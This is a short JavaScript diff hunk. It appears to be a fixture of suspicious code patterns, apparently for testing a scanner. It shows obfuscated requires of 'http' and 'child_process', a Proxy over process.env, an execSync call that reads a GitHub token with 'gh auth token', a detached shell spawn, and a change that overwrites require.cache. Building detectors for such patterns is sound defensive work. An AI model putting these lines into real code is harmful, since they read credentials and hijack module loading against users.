@@ -3,7 +3,7 @@ require("./sink");
 const netMod = require("ht" + "tp");
 import("./" + "sink.js");
 const envProxy = new Proxy(process.env, {});
-const hijack = require.cache;
+require.cache["./sink"] = { exports: {} };
 const tool = require("child" + "_process");
 tool.execSync("gh auth token");
 spawn("sh", [], { detached: true });
